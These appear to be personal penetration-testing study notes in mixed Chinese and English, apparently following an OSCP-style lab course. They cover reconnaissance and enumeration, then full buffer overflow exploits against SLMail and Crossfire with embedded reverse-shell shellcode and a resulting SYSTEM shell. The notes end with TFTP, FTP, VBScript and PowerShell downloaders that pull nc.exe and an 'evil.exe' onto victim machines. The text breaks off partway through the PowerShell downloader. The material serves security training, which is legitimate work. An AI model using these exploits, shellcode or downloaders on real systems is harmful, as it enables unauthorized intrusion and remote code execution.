locate

updatedb 创建本地系统文件数据库

![](media/2fa67b8014f1278c369d6dbc3cb12e9f.png)

which

查找\$PATH中的文件

export PATH=/XXX:\$PATH

![](media/3011744944c2e1e1af85e5946bf721f4.png)

查找文件

![](media/339cae4ae3b34b65f90c6d5be78cfe19.png)

解析域名及ip

![](media/6dc137b7441e158a87a80dfe6be7b7a2.png)

![](media/6d5a93a685ce8d529721b6bc3e005f06.png)

![](media/ea6f18e669b62b65965fb9f37aaa7fe4.png)

处理日志

![](media/38bdc1ff39595a40ba839657826b7184.png)

![](media/141d291084df36cbe41488cae90b26c5.png)

nc

![](media/ea7ee8d3b268a9303c447a8434221658.png)

![](media/b930378b29e8e596ffe926f7baf7ad23.png)

![](media/9e709467979e656265f99e876dd29554.png)

![](media/fb5de83c633e5031ab7a12a93c48dd00.png)

![](media/2b119f01af6998bd74c833b7cf19f785.png)

![](media/ab1a1a017da1af0ada060de6a0ec0f60.png)

![](media/43da8d11abd210cddfb1e9f78d3af95a.png)

ncat

![](media/63e23084fe00a6795738a226bd711772.png)

![](media/c024fe5af341aae8d982c78808aff9cb.png)

wireshark

![](media/570ac7a525176c98da8f9ca2033a91b2.png)

tcpdump

![](media/67ff65b554fcb552f67689a8b7c223be.png)

![](media/861e06063d82527d157a8ed41c96bd83.png)

![](media/1837efd36b780fdcdd70d9a1bff8aed8.png)

![](media/4ff3aaabdc83788dd7ca64f70425bfd3.png)

![](media/6029c1428827942c1016d49748491aee.png)

![](media/617342cb08464e296f6f4131e604e85a.png)

the TCP flags are defined in the 14th byte of the TCP header.

![](media/b77c928f3b4857859230c8c5d781a85e.png)

ACK and PSH flags:

![](media/fecb0d35365e487aa86ed5247f82167d.png)

![](media/34f017c1b62cfbf9e07c844c61abfd20.png)

theharvester收集邮件地址

![](media/f8f559afbb2e26d8b3671494b0d05d5b.png)

![](media/d15a58b7225225d14a7f14408d8e890d.png)

![](media/8cc749b1e525b385ea2fd53cb8179f17.png)

子域名

https://searchdns.netcraft.com/

导出报告

whois

数据库通过whois server tcp 43被公开

![](media/9790e23012943a246aaccd172f53b84b.png)

![](media/48fcff2c97a220b54b43829ae7d2583a.png)

recon-ng

![](media/57c4105cf483d04cd7b69ead7c5ca7d5.png)

whois

![](media/fd141bdcbf433a650a74a15293ccfbb6.png)

![](media/05a4a7d227cc014a06890d23c1070460.png)

http://whois.arin.net/rest/pocs;domain=cisco.com

xss

![](media/821282aef3564a3c1d6199686c1c5000.png)

http://xssed.com/

google search

![](media/89bd0542a69183aae207a188dc83d2ed.png)

site:cisco.com

site:cisco.com -site:proximity.cisco.com -site:tmgmatrix.cisco.com
-site:salesconnect.cisco.com -site:newsroom.cisco.com -site:developer.cisco.com
-site:dcloud.cisco.com -site:jobs.cisco.com -site:meraki.cisco.com
-site:engage2demand.cisco.com -site:umbrella.cisco.com -site:blogs.cisco.com
-site:webex-lt.cisco.com -site:collaborationhelp.cisco.com
-site:ebooks.cisco.com -site:www.cisco.com

host -t

![](media/8d6c6065fef0d7d06a456414cb6ab0e5.png)

host domainname

![](media/797eec157f4632f956f0fbfc46f79794.png)

host ip

![](media/9aeb6d32386175023eab9925f509dc6f.png)

host -l

![](media/36c623a7eeb2ef176fff799d41e4838a.png)

Simple Zone Transfer Bash Script:

![](media/b0d0292a4e916647145f6eebfdcdcd2f.png)

![](media/3eb0429b3da8530bfe1a657de4b9312b.png)

dnsrecon

![](media/50aa3acbf638363f09d380bc1e04aac2.png)

dnsenum

![](media/6ade60b7a1a71c2506897216ddae9497.png)

nc port scanning:

tcp

![](media/e5409a03b0aed3c94a63fab4a8d28b17.png)

udp

![](media/cfe8dc546aae9ec5b2c7b398e0c8a0da.png)

smb扫描:

nmap -v -p 139,445 -oG smb.txt xx.xx.xx.1-254

nbtscan -r xx.xx.xx.0/24

enum4linux -a xx.xx.xx.xx

nse脚本 /usr/share/nmap/scripts/smb\*

nmap -v -p 139,445 --script=smb-os-discovery ip

nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 ip

smtp枚举:

nc -nv ip 25

VRFY root

250 2.1.5 root \<root\@redhat.acme.com\>

VRFY idontexist

550 5.1.1 idontexist... User unknown

验证用户脚本:

import socket

import sys

if len(sys.argv) != 2:

print "Usage: vrfy.py \<username\>"

sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect=s.connect(('ip',25))

banner=s.recv(1024)

print banner

s.send('VRFY ' + sys.argv[1] + '\\r\\n')

result=s.recv(1024)

print result

s.close()

SNMP枚举:

nmap -sU --open -p 161 x.x.x.1-254 -oG snmp.txt

onesixtyone爆破共同体名

echo public \> community

echo private \>\> community

echo manager \>\> community

for ip in \$(seq 1 254);do echo xx.xx.xx.\$ip;done \> ips

onesixtyone -c community -i ips

![](media/8c2e70e1072a5f7dbfc22973f8e307b5.png)

snmpwalk -c public -v1 ip

iso.3.6.1.2.1.1.1.0 = STRING: "Linux ubuntu 3.2.0-23-generic \#36-Ubuntu SMP "

iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10

iso.3.6.1.2.1.1.3.0 = Timeticks: (66160) 0:11:01.60

windows users:

snmpwalk -c public -v1 ip 1.3.6.1.4.1.77.1.2.25

Running Windows Processes:

snmpwalk -c public -v1 ip 1.3.6.1.2.1.25.4.2.1.2

Open TCP Ports:

snmpwalk -c public -v1 ip 1.3.6.1.2.1.6.13.1.3

Installed Software:

snmpwalk -c public -v1 ip 1.3.6.1.2.1.25.6.3.1.2

snmp-check

![](media/4ad0df6ba6bb21146afd234ad4bca75e.png)

漏洞扫描:

![](media/5a056169f8c9b41f232ebfe6957f1757.png)

nmap -v -p 80 --script=http-vuln-cve2010-2861 ip

nmap -v -p 21 --script=ftp-anon.nse x.x.x.1-254

nmap -v -p 139,445 --script=smb-security-mode ip

nmap -v -p 80 --script=http-vuln-cve2011-3192 x.x.x.205-210

openvas

apt-get update && apt-get install -y openvas

openvas-setup

[\>] Checking for admin user

[\*] Creating admin user

User created with password 'cca3e09f-b64d-44a2-9180-9d4d6f0a6134'.

firefox https://127.0.0.1:9392

缓冲区溢出(buffer overflows)

内存保护机制:

1.DEP 数据执行阻止

DEP is a set of hardware, and software, technologies that perform additional

checks on memory, to help prevent malicious code from running on a system.

The primary benefit of DEP is to help prevent code execution from data pages,

by raising an exception, when execution occurs.

2.ASLR 地址空间随机化

ASLR randomizes the base addresses of loaded applications, and DLLs, every

time the Operating System is booted.

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:

>   print "\\nSending evil buffer..."

>   s.connect(('10.0.0.22',110)) \# connect to IP, POP3 port

>   data = s.recv(1024) \# receive banner

>   print data \# print banner

>   s.send('USER test' +'\\r\\n') \# send username "test"

>   data = s.recv(1024) \# receive reply

>   print data \# print reply

>   s.send('PASS test\\r\\n') \# send password "test"

>   data = s.recv(1024) \# receive reply

>   print data \# print reply

>   s.close() \# close socket

>   print "\\nDone!"

except:

print "Could not connect to POP3!"

fuzz用户密码:

import socket

\# Create an array of buffers, from 1 to 5900, with increments of 200.

buffer=["A"]

counter=100

while len(buffer) \<= 30:

>   buffer.append("A"\*counter)

>   counter=counter+200

for string in buffer:

>   print "Fuzzing PASS with %s bytes" % len(string)

>   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

>   connect=s.connect(('10.0.0.22',110))

>   s.recv(1024)

>   s.send('USER test\\r\\n')

>   s.recv(1024)

>   s.send('PASS ' + string + '\\r\\n')

>   s.send('QUIT\\r\\n')

>   s.close()

Fuzzing PASS with 1 bytes

…

Fuzzing PASS with 2700 bytes

Fuzzing PASS with 2900 bytes

![](media/be4efbf35f9ece91448378abdbe86dd4.png)

the Extended Instruction Pointer (EIP) register has been overwritten with our
input buffer of A’s (the hex equivalent of the letter A is \\x41)

the EIP register also controls the execution flow of the application

This means that if we craft our exploit buffer carefully, we might be able to
divert the execution of the program to a place of our choosing, such as a into
the memory where we can introduce some reverse shell code, as part of our
buffer.

Win32 Buffer Overflow Exploitation

crash脚本:

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' \* 2700

try:

>   print "\\nSending evil buffer..."

>   s.connect(('10.0.0.22',110))

>   data = s.recv(1024)

>   s.send('USER username' +'\\r\\n')

>   data = s.recv(1024)

>   s.send('PASS ' + buffer + '\\r\\n')

>   print "\\nDone!."

except:

print "Could not connect to POP3!"

控制EIP寄存器:

1.Binary Tree Analysis

Instead of 2700 A’s, we send 1350 A's and 1350 B's. If EIP is overwritten by
B's, we know

the four bytes reside in the second half of the buffer. We then change the 1350
B's to 675

B's and 675 C's, and send the buffer again. If EIP is overwritten by C's, we
know that the

four bytes reside in the 2000–2700 byte range. We continue splitting the
specific buffer

until we reach the exact four bytes that overwrite EIP. Mathematically, this
should

happen in seven iterations.

2.Sending a Unique String

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb

![](media/251229360a37397f88507e166093173f.png)

Note both the ESP and EIP register values in this next crash.

![](media/d4ccb9b2899f58728b99232ceb44dd8d.png)

39 69 44 38 (equivalent to the string 8Di9)

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb

![](media/95f5ee84d9a371e3edd090e4bbe3512a.png)

buffer = “A” \* 2606 + “B” \* 4 + “C” \* 90

![](media/5c587f19749ef01411517bd408171734.png)

Locating Space for Your Shellcode

A standard reverse shell payload requires about 350-400 bytes of space.

the ESP register points directly to the beginning of our buffer of C’s. This
seems like a convenient location to place our shellcode as it will be easily
accessible to us through the ESP register later on.

![](media/bc79dfa62b5912798c699e8b3a220c2d.png)

However, on counting those C’s, we notice that we have a total of 90 of them –
not enough to contain a 350-byte payload. One easy way out of this is simply to
try to increase our buffer length from 2700 bytes to 3500 bytes, and see if this
results in a larger buffer space for our shellcode.

buffer = “A” \* 2606 + “B” \* 4 + “C” \* (3500-2606-4)

![](media/fc183f0427e7554ba41bc6b298e4a3ee.png)

430个C

we see that a total of 430 bytes of free space are available to us to use for
shellcode.

take note that this address is not the same as the address from the previous
crashes.

检查坏字符:

One example of a common bad character (especially in buffer overflows caused by
unchecked string copy operations) is the null byte (0x00).

This character is considered bad because a null byte is also used to terminate a
string

copy operation, which would effectively truncate our buffer to wherever the
first null

byte appears.

Another example of a bad character, specific to the POP3 PASS command, is the
carriage return (0x0D), which signifies to the application that the end of the
password has been reached.

An experienced exploit writer knows to check for bad characters,to prevent
future problems. An easy way to do this is to send all possible characters, from
0x00 to 0xff, as part of our buffer, and see how these characters are dealt with
by the application, after the crash occurs.

检查脚本:

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = (

"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10"

"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20"

"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30"

"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"

"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50"

"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60"

"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70"

"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80"

"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90"

"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0"

"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0"

"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0"

"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0"

"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0"

"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0"

"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff")

buffer="A"\*2606 + "B"\*4 + badchars

try:

>   print "\\nSending evil buffer..."

>   s.connect(('10.0.0.22',110))

>   data = s.recv(1024)

>   s.send('USER username' +'\\r\\n')

>   data = s.recv(1024)

>   s.send('PASS ' + buffer + '\\r\\n')

>   s.close()

>   print "\\nDone!"

except:

print "Could not connect to POP3!"

0x0A seems to have truncated the rest of the buffer that comes after it

the 0x0A character is a Line Feed

the 0x0D character is a Carriage Return

![](media/f75d8b69ed0fbf5537fcd2fcb2dbeafe.png)

重定向执行流:

Our next task is finding a way to redirect the execution flow to the shellcode
located at the memory address that the ESP register is pointing to, at crash
time.

However, as youshould have noticed from the past few debugger restarts, the
value of ESP changes,from crash to crash. Therefore, hardcoding a specific stack
address would not provide a reliable way of getting to our buffer. This is
because stack addresses change often,

especially in threaded applications such as SLMail, as each thread has its
reserved stack memory region allocated by the operating system.

Finding a Return Address

If we can’t jump directly to our buffer, what other options do we have? We need
a more

generic way to get to the address ESP points to, at the time of the crash. If we
can find

an accessible, reliable address in memory that contains an instruction such as
JMP ESP,

we could jump to it, and in turn end up at the address pointed to, by the ESP
register, at

the time of the jump.

the Immunity Debugger script, mona.py. This script will help us identify modules
in memory that we can search for such a “return address”, which in our case is a
JMP ESP command. We will need to make sure to choose a module with the following
criteria:

1. No memory protections such as DEP and ASLR present.

2. Has a memory range that does not contain bad characters.

!mona modules command within Immunity Debugger

![](media/d87ed53264af5fef32e7be4a9e6f66d8.png)

The mona.py script has identified the SLMFC.DLL as not being affected by any
memory protection schemes, as well as not being rebased on each reboot. This
means that this DLL will always reliably load to the same address.

Now, we need to find a naturally occurring JMP ESP (or equivalent) instruction
within this DLL, and identify at what address this instruction is located. Let’s
take a closer look at the memory mapping of this DLL.

![](media/10dfe04ab3333ca4e10653becce645c1.png)

If this application were compiled with DEP support, our JMP ESP address would
have to be located in the code (.text) segment of the module, as that is the
only segment with both Read (R) and Executable (E) permissions.

However, since no DEP is enabled, we are free to use instructions from any
address in this module.

As searching for a JMP ESP address from within Immunity Debugger will only
display addresses from the code section.

we will need to run a more exhaustive binary search for a JMP ESP, or
equivalent, opcode. To find the opcode equivalent to JMP ESP, we can use the
Metasploit NASM Shell ruby script:

![](media/a4157bce5becff9da9de0ccad4e7847d.png)

we can search for this opcode in all the sections of the slmfc.dll file using
the Mona script:

Searching for a JMP ESP Instruction

![](media/04e2cc13f82ca2caf82b5cd8c74f54cf.png)

We choose one which does not contain any bad characters, such as 0x5f4a358f, and
double-check the contents of this address, inside the debugger.

![](media/1c89365568e9fe993f6ffa1a408a0813.png)

Address 0x5f4a358f in SLMFC.dll contains a JMP ESP instruction. If we redirect
EIP to this address at the time of the crash, a JMP ESP instruction will be
executed, which will lead the execution flow into our shellcode.

payload:

buffer = "A" \* 2606 + "\\x8f\\x35\\x4a\\x5f" + "C" \* 390

place a memory breakpoint at the address 0x5f4a358f

Using F2, we place a breakpoint on the return address, and run our exploit again

![](media/11b2c984fd3e411da0ff54af9aaa66d1.png)

Pressing F7 in the debugger will single step us into the shellcode, which is
currently just a bunch of C’s.

使用MSF生成shellcode

![](media/b7146b2c32cd94fd3d16433eaaa67265.png)

![](media/8c24c8c1731c7539cadf1bc15844bf7c.png)

351 bytes

The resulting shellcode will send a reverse shell to 10.0.0.4 on port 443,
contains no bad characters, and is 351 bytes long.

获取shell

However, since the ESP register points to the beginning of our payload, the
Metasploit Framework decoder will step on its toes, by overwriting the first few
bytes of our shellcode, rendering it useless. We can avoid this issue by adding
few No Operation (NOP) instructions (0x90) at the beginning of our shellcode. As
the name suggests, this instruction does nothing - it simply moves on to the
next instruction to be executed.

\#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode =
("\\xba\\x36\\xb6\\x24\\xa0\\xd9\\xeb\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1"

"\\x52\\x83\\xe8\\xfc\\x31\\x50\\x0e\\x03\\x66\\xb8\\xc6\\x55\\x7a\\x2c\\x84"

"\\x96\\x82\\xad\\xe9\\x1f\\x67\\x9c\\x29\\x7b\\xec\\x8f\\x99\\x0f\\xa0\\x23"

"\\x51\\x5d\\x50\\xb7\\x17\\x4a\\x57\\x70\\x9d\\xac\\x56\\x81\\x8e\\x8d\\xf9"

"\\x01\\xcd\\xc1\\xd9\\x38\\x1e\\x14\\x18\\x7c\\x43\\xd5\\x48\\xd5\\x0f\\x48"

"\\x7c\\x52\\x45\\x51\\xf7\\x28\\x4b\\xd1\\xe4\\xf9\\x6a\\xf0\\xbb\\x72\\x35"

"\\xd2\\x3a\\x56\\x4d\\x5b\\x24\\xbb\\x68\\x15\\xdf\\x0f\\x06\\xa4\\x09\\x5e"

"\\xe7\\x0b\\x74\\x6e\\x1a\\x55\\xb1\\x49\\xc5\\x20\\xcb\\xa9\\x78\\x33\\x08"

"\\xd3\\xa6\\xb6\\x8a\\x73\\x2c\\x60\\x76\\x85\\xe1\\xf7\\xfd\\x89\\x4e\\x73"

"\\x59\\x8e\\x51\\x50\\xd2\\xaa\\xda\\x57\\x34\\x3b\\x98\\x73\\x90\\x67\\x7a"

"\\x1d\\x81\\xcd\\x2d\\x22\\xd1\\xad\\x92\\x86\\x9a\\x40\\xc6\\xba\\xc1\\x0c"

"\\x2b\\xf7\\xf9\\xcc\\x23\\x80\\x8a\\xfe\\xec\\x3a\\x04\\xb3\\x65\\xe5\\xd3"

"\\xb4\\x5f\\x51\\x4b\\x4b\\x60\\xa2\\x42\\x88\\x34\\xf2\\xfc\\x39\\x35\\x99"

"\\xfc\\xc6\\xe0\\x0e\\xac\\x68\\x5b\\xef\\x1c\\xc9\\x0b\\x87\\x76\\xc6\\x74"

"\\xb7\\x79\\x0c\\x1d\\x52\\x80\\xc7\\xe2\\x0b\\x8c\\x97\\x8b\\x49\\x90\\x86"

"\\x2c\\xc7\\x76\\xc2\\xa2\\x81\\x21\\x7b\\x5a\\x88\\xb9\\x1a\\xa3\\x06\\xc4"

"\\x1d\\x2f\\xa5\\x39\\xd3\\xd8\\xc0\\x29\\x84\\x28\\x9f\\x13\\x03\\x36\\x35"

"\\x3b\\xcf\\xa5\\xd2\\xbb\\x86\\xd5\\x4c\\xec\\xcf\\x28\\x85\\x78\\xe2\\x13"

"\\x3f\\x9e\\xff\\xc2\\x78\\x1a\\x24\\x37\\x86\\xa3\\xa9\\x03\\xac\\xb3\\x77"

"\\x8b\\xe8\\xe7\\x27\\xda\\xa6\\x51\\x8e\\xb4\\x08\\x0b\\x58\\x6a\\xc3\\xdb"

"\\x1d\\x40\\xd4\\x9d\\x21\\x8d\\xa2\\x41\\x93\\x78\\xf3\\x7e\\x1c\\xed\\xf3"

"\\x07\\x40\\x8d\\xfc\\xd2\\xc0\\xbd\\xb6\\x7e\\x60\\x56\\x1f\\xeb\\x30\\x3b"

"\\xa0\\xc6\\x77\\x42\\x23\\xe2\\x07\\xb1\\x3b\\x87\\x02\\xfd\\xfb\\x74\\x7f"

"\\x6e\\x6e\\x7a\\x2c\\x8f\\xbb")

buffer="A"\*2606 + "\\x8f\\x35\\x4a\\x5f" + "\\x90" \* 8 + shellcode

try:

>   print "\\nSending evil buffer..."

>   s.connect(('10.0.0.22',110))

>   data = s.recv(1024)

>   s.send('USER username' +'\\r\\n')

>   data = s.recv(1024)

>   s.send('PASS ' + buffer + '\\r\\n')

>   s.close()

>   print "\\ Done. Did you get a reverse shell?"

except:

print "Could not connect to POP3!"

192.168.6.128:

nc -nlvp 4455

python exploit.py

Microsoft Windows [Version 6.1.7600]

Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\\Program Files\\SLmail\\System\>whoami

whoami

nt authority\\system

Once we exit the reverse shell, the SLMail POP3 service crashes and exits.

优化EXP

When using default Metasploit Framework shellcode, the default exit method the
shellcode uses, at the end of shellcode execution, is the ExitProcess. This exit
method will shut down the whole mail service process, effectively killing the
SLMail service, and causing it to crash.

If the program we are exploiting is a threaded application (which it is, in this
instance),

we can try to avoid crashing the service completely, by using an ExitThread
method

instead, which will just terminate the affected thread of the program. This will
make

our exploit work without interrupting the usual operations of the POP3 server,
as well

as allow us to repeatedly exploit the server, and exit the shell without
bringing down

the service. To instruct msfvenom to use the ExitThread method during the
shellcode

generation, we can issue the following command:

![](media/ad65b2fd9bc4166e496784e50da20fa6.png)

Linux缓冲区溢出利用

This section explores the process of exploiting a Linux application, the online
multiplayer RPG game, Crossfire.

Evans Linux debugger (EDB)

环境配置:

iptables -A INPUT -p tcp --destination-port 13327 \\! -d 127.0.0.1 -j DROP

iptables -A INPUT -p tcp --destination-port 4444 \\! -d 127.0.0.1 -j DROP

download and install the vulnerable version of crossfire in Kali Linux(i486
VMWare machine)

cd /usr/games/

wget www.offensive-security.com/crossfire.tar.gz

tar zxpf crossfire.tar.gz

In more recent Linux kernels and compilers, various memory protection techniques
have been implemented, such as memory randomization, stack cookies, etc.
Bypassing these protection mechanisms is beyond the scope of this module.

The version of crossfire we are testing was compiled without the stack smashing
protection support, as well as without ASLR and DEP support.

apt-get update

apt-get install edb-debugger

edb --run /usr/games/crossfire/bin/crossfire

crash poc:

\#!/usr/bin/python

import socket

host = "127.0.0.1"

crash="\\x41" \* 4379

buffer = "\\x11(setup sound " + crash + "\\x90\\x00\#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[\*]Sending evil buffer..."

s.connect((host, 13327))

data=s.recv(1024)

print data

s.send(buffer)

s.close()

print "[\*]Payload Sent !"

Controlling EIP

![](media/377b796e52fe6479eb5d77bd010f530a.png)

![](media/51bb4a2c2e7fab71cf05e8a906e3adcc.png)

![](media/5a66ff8332dd90271655d6c44a78439f.png)

crash = "\\x41" \* 4368 + "B" \* 4 + "C" \* 7

![](media/56d2963d0c17a2df117d648c4b0dea4f.png)

![](media/8896861d410f82aa2659079db75c60f6.png)

\\x83\\xc0\\x0c\\xff\\xe0

bad chars:

\\x00\\x0a\\x0d\\x20

![](media/2685f2f82a61c703bc06a38fbe194bde.png)

crash = "\\x41" \* 4368 + "\\x97\\x45\\x13\\x08" +
"\\x83\\xc0\\x0c\\xff\\xe0\\x90\\x90"

![](media/d7fcdb34d9d258ad3bc67c39db6a9c97.png)

exp:

\#!/usr/bin/python

import socket

host = "127.0.0.1"

shellcode =
("\\xdb\\xc4\\xbe\\xc4\\x9a\\x3f\\x94\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1"

"\\x14\\x83\\xc0\\x04\\x31\\x70\\x15\\x03\\x70\\x15\\x26\\x6f\\x0e\\x4f\\x51"

"\\x73\\x22\\x2c\\xce\\x1e\\xc7\\x3b\\x11\\x6e\\xa1\\xf6\\x51\\xd4\\x70\\x5b"

"\\x39\\xe9\\x8c\\x4a\\xe5\\x87\\x9c\\x3d\\x45\\xd1\\x7c\\xd7\\x03\\xb9\\xb3"

"\\xa8\\x42\\x78\\x48\\x1a\\x50\\xcb\\x36\\x91\\xd8\\x68\\x07\\x4f\\x15\\xee"

"\\xf4\\xc9\\xcf\\xd0\\xa2\\x24\\x8f\\x66\\x2a\\x4f\\xe7\\x57\\xe3\\xdc\\x9f"

"\\xcf\\xd4\\x40\\x36\\x7e\\xa2\\x66\\x98\\x2d\\x3d\\x89\\xa8\\xd9\\xf0\\xca")

ret="\\x97\\x45\\x13\\x08"

crash=shellcode + "\\x41" \* (4368-105) + ret +
"\\x83\\xC0\\x0C\\xFF\\xE0\\x90\\x90"

buffer = "\\x11(setup sound " + crash + "\\x90\\x00\#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[\*]Sending evil buffer..."

s.connect((host, 13327))

data=s.recv(1024)

print data

s.send(buffer)

s.close()

print "[\*]Payload Sent !

nc -v 127.0.0.1 4444

Searching for Exploits

<https://www.exploit-db.com/>

<https://www.securityfocus.com/>

![](media/860d68c56f9476ea14233ad1960a0d3b.png)

Kali下windows编译环境

apt-get install mingw-w64

i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe

wine 646.exe 10.11.1.35

Uploading Files

1.TFTP

TFTP is a UDP based file transfer protocol

Windows operating systems up to Windows XP and 2003 contain a TFTP client, by
default. In Windows 7, 2008, and above, this tool needs to be explicitly added,
during installation.

the tftp client can work non-interactively, making the file transfer easy, if
the correct conditions exist.

server:

![](media/2fcd09cd7d3bff540480d9cd4516cf9b.png)

client:

tftp -i ip get nc.exe

2.Uploading Files with FTP

Windows operating systems contain a default FTP client that can also be used for
file transfers. As we’ve previously seen, the ftp.exe client is an interactive
program that requires input to complete. We will need to solve this problem
before attempting to use FTP as a file transfer protocol.

![](media/43838dfb61f12cebcb50479ebf849a7c.png)

Server:

apt-get install pure-ftpd

ftp用户创建脚本(755):

\#!/bin/bash

groupadd ftpgroup

useradd -g ftpgroup -d /dev/null -s /etc ftpuser

pure-pw useradd username -u ftpuser -d /ftphome

pure-pw mkdb

cd /etc/pure-ftpd/auth/

ln -s ../conf/PureDB 60pdb

mkdir -p /ftphome

chown -R ftpuser:ftpgroup /ftphome/

/etc/init.d/pure-ftpd restart

![](media/a6302dd5aab1f5810b72d3cf1a862536.png)

Client:

echo open 192.168.6.128 21\>ftp.txt

echo USER scotoma8\>\>ftp.txt

echo scotoma8\>\>ftp.txt

echo bin \>\>ftp.txt

echo GET nc.exe \>\>ftp.txt

echo bye \>\>ftp.txt

ftp -v -n -s:ftp.txt

![](media/c0d83add74fb6ad724a5d3e752d49f00.png)

3. Uploading Files Using Scripting Languages

Scripting engines such as VBScript (in Windows XP, 2003) and PowerShell (in
Windows 7, 2008, and above) can both be leveraged to download files to our
victim machine.

VBS script - simple HTTP downloader

cmd:

echo strUrl = WScript.Arguments.Item(0) \> wget.vbs

echo StrFile = WScript.Arguments.Item(1) \>\> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 \>\> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 \>\> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 \>\> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 \>\> wget.vbs

echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts \>\>
wget.vbs

echo Err.Clear \>\> wget.vbs

echo Set http = Nothing \>\> wget.vbs

echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") \>\> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
\>\> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
\>\> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") \>\>
wget.vbs

echo http.Open "GET", strURL, False \>\> wget.vbs

echo http.Send \>\> wget.vbs

echo varByteArray = http.ResponseBody \>\> wget.vbs

echo Set http = Nothing \>\> wget.vbs

echo Set fs = CreateObject("Scripting.FileSystemObject") \>\> wget.vbs

echo Set ts = fs.CreateTextFile(StrFile, True) \>\> wget.vbs

echo strData = "" \>\> wget.vbs

echo strBuffer = "" \>\> wget.vbs

echo For lngCounter = 0 to UBound(varByteArray) \>\> wget.vbs

echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) \>\>
wget.vbs

echo Next \>\> wget.vbs

echo ts.Close \>\> wget.vbs

vbs:

strUrl = WScript.Arguments.Item(0)

StrFile = WScript.Arguments.Item(1)

Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0

Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0

Const HTTPREQUEST_PROXYSETTING_DIRECT = 1

Const HTTPREQUEST_PROXYSETTING_PROXY = 2

Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts

Err.Clear

Set http = Nothing

Set http = CreateObject("WinHttp.WinHttpRequest.5.1")

If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")

If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")

If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")

http.Open "GET", strURL, False

http.Send

varByteArray = http.ResponseBody

Set http = Nothing

Set fs = CreateObject("Scripting.FileSystemObject")

Set ts = fs.CreateTextFile(StrFile, True)

strData = ""

strBuffer = ""

For lngCounter = 0 to UBound(varByteArray)

ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))

Next

ts.Close

![](media/d74bc34dc838e91aa9194d52f442d985.png)

![](media/9cd9c3f66b4800a2391d5f188ee04770.png)

Powershell script - simple HTTP downloader

cmd:

echo \$storageDir = \$pwd \> wget.ps1

echo \$webclient = New-Object System.Net.WebClient \>\>wget.ps1

echo \$url = "http://10.11.0.5/evil.exe" \>\>wget.ps1

